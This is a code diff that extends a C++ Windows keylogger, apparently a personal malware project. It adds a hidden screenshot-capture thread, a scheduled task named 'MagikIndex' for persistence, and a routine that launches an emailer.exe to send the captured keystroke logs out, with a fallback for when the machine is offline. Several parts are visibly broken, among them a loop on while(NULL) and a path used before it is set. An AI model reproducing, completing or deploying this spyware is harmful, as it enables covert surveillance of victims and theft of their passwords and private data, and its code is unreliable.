@@ -1,4 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
+#include <atlbase.h>
+#include <atlconv.h>
+#include <assert.h>
 #include <windows.h>
 #include <wininet.h>
 #include <iostream>
@@ -9,6 +12,7 @@
 #include <vector>
 #include <shellapi.h>
 #include <time.h>
+#include <taskschd.h>
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
 
@@ -31,6 +35,7 @@ typedef unsigned long long uint64_t;
 #define RequiredCores 2 
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
+#define SecondsBetweenScreenshots
 
 
 #define MAX_LENGTH 1024
@@ -64,6 +69,190 @@ FILE* OUTPUT_FILE;
 
 extern "C" int RandomGenerator();
 
+
+PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
+{
+    BITMAP bmp = {
+  NULL,
+  NULL,
+  NULL,
+  NULL,
+  NULL,
+  NULL
+    };
+    PBITMAPINFO pbmi;
+    WORD    cClrBits;
+
+    // Retrieve the bitmap color format, width, and height.  
+    assert(GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp));
+
+    // Convert the color format to a count of bits.  
+    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
+    if (cClrBits == 1)
+        cClrBits = 1;
+    else if (cClrBits <= 4)
+        cClrBits = 4;
+    else if (cClrBits <= 8)
+        cClrBits = 8;
+    else if (cClrBits <= 16)
+        cClrBits = 16;
+    else if (cClrBits <= 24)
+        cClrBits = 24;
+    else cClrBits = 32;
+
+    // Allocate memory for the BITMAPINFO structure. (This structure  
+    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
+    // data structures.)  
+
+    if (cClrBits < 24)
+        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+            sizeof(BITMAPINFOHEADER) +
+            sizeof(RGBQUAD) * (1 << cClrBits));
+
+    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 
+
+    else
+        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+            sizeof(BITMAPINFOHEADER));
+
+    // Initialize the fields in the BITMAPINFO structure.  
+
+    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    pbmi->bmiHeader.biWidth = bmp.bmWidth;
+    pbmi->bmiHeader.biHeight = bmp.bmHeight;
+    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
+    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
+    if (cClrBits < 24)
+        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);
+
+    // If the bitmap is not compressed, set the BI_RGB flag.  
+    pbmi->bmiHeader.biCompression = BI_RGB;
+
+    // Compute the number of bytes in the array of color  
+    // indices and store the result in biSizeImage.  
+    // The width must be DWORD aligned unless the bitmap is RLE 
+    // compressed. 
+    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
+        * pbmi->bmiHeader.biHeight;
+    // Set biClrImportant to 0, indicating that all of the  
+    // device colors are important.  
+    pbmi->bmiHeader.biClrImportant = 0;
+    return pbmi;
+}
+
+void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP)
+{
+    HANDLE hf;                
+    BITMAPFILEHEADER hdr;     
+    PBITMAPINFOHEADER pbih;       
+    LPBYTE lpBits;                
+    DWORD dwTotal;                
+    DWORD cb;                     
+    BYTE* hp;                   
+    DWORD dwTmp;
+    PBITMAPINFO pbi;
+    HDC hDC;
+    hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));
+    SelectObject(hDC, hBMP);
+    pbi = CreateBitmapInfoStruct(hBMP);
+    pbih = (PBITMAPINFOHEADER)pbi;
+    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
+    assert(lpBits);
+    assert(GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,DIB_RGB_COLORS));  
+    hf = CreateFileA(pszFile,GENERIC_READ | GENERIC_WRITE,(DWORD)0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,(HANDLE)NULL);
+    assert(hf != INVALID_HANDLE_VALUE);
+    hdr.bfType = 0x4d42;
+    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
+    hdr.bfReserved1 = 0;
+    hdr.bfReserved2 = 0;
+    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);
+    assert(WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL));
+    assert(WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD),(LPDWORD)&dwTmp, (NULL)));
+    dwTotal = cb = pbih->biSizeImage;
+    hp = lpBits;
+    assert(WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL));
+    assert(CloseHandle(hf));
+    GlobalFree((HGLOBAL)lpBits);
+}
+
+
+ULONG WINAPI ScreenGrabber(LPVOID Parameter) {
+
+    char* AppData = nullptr;
+    size_t AppDataSize;
+    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+    std::string CurrentLog;
+    char PathToFile[MAX_PATH];
+    HMODULE GetModH = GetModuleHandle(NULL);
+    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
+    std::string LogTime = std::to_string(rand()%10000-100);
+    strcat_s(AppData,sizeof(AppData), "\\MagikGlass");
+    CreateDirectoryA(CurrentLog.c_str(), NULL);
+
+    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
+    CurrentLog += "\\ScreenShot";
+    CurrentLog += LogTime;
+    CurrentLog += ".bmp";
+
+    while (NULL) {
+        LogTime = std::to_string(rand() % 10000 - 100);
+        CurrentLog = AppData;
+        CurrentLog += "\\ScreenShot";
+        CurrentLog += LogTime;
+        CurrentLog += ".bmp";
+        HDC hScreenDC = GetDC(nullptr); // CreateDC("DISPLAY",nullptr,nullptr,nullptr);
+        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+        int width = GetDeviceCaps(hScreenDC, HORZRES);
+        int height = GetDeviceCaps(hScreenDC, VERTRES);
+        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+        HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
+        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+        hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));
+        DeleteDC(hMemoryDC);
+        DeleteDC(hScreenDC);
+
+        CreateBMPFile(CurrentLog.c_str(),hBitmap);
+    
+    }
+}
+
+HRESULT SetUploadTask(std::string PathToEmailer, std::string LogToSend) {  //thank you Microsoft for not documenting shit and forcing me to dig every little bit on the internet just to make this
+    CA2W PathToEmailerUnicode(PathToEmailer.c_str());
+    CA2W LogToSendUnicode(LogToSend.c_str());
+    CComPtr<ITaskService> service;
+    service.CoCreateInstance(__uuidof(TaskScheduler));
+    service->Connect(CComVariant(), // local computer 
+        CComVariant(), // current user 
+        CComVariant(), // current domain 
+        CComVariant()); // no password
+    CComPtr<ITaskFolder> folder;
+    service->GetFolder(CComBSTR(L"\\"), &folder);
+    CComPtr<ITaskFolder> newFolder;
+    folder->CreateFolder(CComBSTR(L"MagikIndex"),CComVariant(), &newFolder);
+    CComPtr<ITaskDefinition> definition;
+    service->NewTask(0, &definition);
+    CComPtr<IPrincipal> principal;
+    definition->get_Principal(&principal);
+    principal->put_RunLevel(TASK_RUNLEVEL_LUA);
+    CComPtr<IActionCollection> actions;
+    definition->get_Actions(&actions);
+    CComPtr<IAction> action;
+    actions->Create(TASK_ACTION_EXEC, &action);
+    CComQIPtr<IExecAction> execAction(action);
+    execAction->put_Path(CComBSTR(PathToEmailerUnicode));
+    execAction->put_Arguments(CComBSTR(LogToSendUnicode));
+    CComPtr<ITriggerCollection> triggers;
+    definition->get_Triggers(&triggers);
+    CComPtr<ITrigger> trigger;
+    triggers->Create(TASK_TRIGGER_DAILY, &trigger);
+    CComQIPtr<IDailyTrigger> weeklyTrigger(trigger);
+    weeklyTrigger->put_StartBoundary(CComBSTR(L"2007-01-01T02:00:00-08:00"));
+    weeklyTrigger->put_EndBoundary(CComBSTR(L"2035-05-02T12:05:00"));
+    weeklyTrigger->put_DaysInterval((short)2);
+    CComPtr<IRegisteredTask> registeredTask;
+    folder->RegisterTaskDefinition(CComBSTR(L"Task"), definition, TASK_CREATE_OR_UPDATE, CComVariant(), CComVariant(), TASK_LOGON_INTERACTIVE_TOKEN, CComVariant(), &registeredTask);
+}
 
 int ExtrapolateKey() {
 
@@ -179,7 +368,7 @@ void LogItInt(int key_stroke,std::string FileName) {
     else if (key_stroke == VK_SHIFT)
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
     else if (key_stroke == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]"));
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
     else if (key_stroke == VK_ESCAPE)
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
     else if (key_stroke == VK_END)
@@ -316,6 +505,9 @@ int main()
 #endif
 
     bool FirstLog = true;
+
+    unsigned long ThreadId2;
+    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
 
 Log:
 
@@ -691,10 +883,18 @@ Log:
      LogItChar("\n_____________________________________________", CurrentLog);
      LogItChar("Character limit hit, sending log...",CurrentLog);
 
-     std::string Emailer = "emailer.exe ";
-     Emailer += CurrentLog;
-     system(Emailer.c_str());
+     std::string Emailer = "C:\\Users\\";
+     Emailer += UserName;
+     Emailer += "\\Music\\MagikIndex";
+     Emailer += "\\emailer.exe ";
 
+     if (!InternetGetConnectedState(&DWFlags, NULL)) {
+         LogItChar("No Internet, scheduling task for log extraction...",CurrentLog);
+         SetUploadTask(Emailer,CurrentLog);
+     }else{
+         Emailer += CurrentLog;
+         system(Emailer.c_str());
+     }
      FirstLog = false;
 
      goto Log;
